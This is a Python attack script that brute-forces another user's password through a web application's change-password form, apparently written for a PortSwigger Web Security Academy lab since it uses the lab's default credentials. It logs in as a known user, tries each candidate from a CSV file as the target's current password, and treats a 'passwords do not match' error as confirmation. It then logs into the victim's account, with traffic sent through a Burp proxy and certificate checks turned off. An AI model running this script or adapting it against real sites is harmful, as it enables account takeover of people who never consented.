import pandas as pd
import sys
import requests
import urllib3


# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def pw_bruteforce(url, username):
    password_list = []
    data = pd.read_csv('./burp_pass.csv')
    for passw in data:
        password_list.append(passw)

    # Login with known creds to pull cookies
    s = requests.Session()
    data1 = { 
        'username':'wiener',
        'password':'peter'
    }
    s1 = s.get(url+'login',proxies=proxies,verify=False)
    s2 = s.post(url+'login',proxies=proxies,verify=False, data=data1)
    
    for pw in password_list:
        
        
        data = {
            'username':username,
            'current-password':pw,
            'new-password-1':'test',
            'new-password-2':'testing123'
        }

        r = s.post(url + 'my-account/change-password', data=data, proxies=proxies, verify=False)
        if 'passwords do not match' in r.text:
            print(f'***** {pw} valid for {username} *****')
            return pw
            break

def login_account(password, username, url):
    s = requests.Session()
    r1 = s.get(url+'login', proxies=proxies, verify=False)
    data = {
        "username":username,
        "password":password
    }
    r2 = s.post(url+'login',data=data, proxies=proxies, verify=False)
    
    if 'Your username' in r2.text:
        print(f'***** {password} verified for {username} *****')
    else:
        print(f'[-]{password} verificadtion for {username} failed')

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        username = sys.argv[2].strip()
        #session_cookie = sys.argv[3].strip()
        #session_2 = sys.argv[4].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} url username')
        print(f'[-] Example: {sys.argv[0]} www.example.com carlos session1 session2')
        sys.exit(-1)
    
    
    print('[-] Performing password change brute force')
    password = pw_bruteforce(url, username)
    if password:
        login = input('[+] Test login? Y/n ')
        if login == 'Y':
            print('[-] Ok - logging in to verify account')
            login_account(password, username, url)
    else:
        print('[-] Brute force unsuccessful')




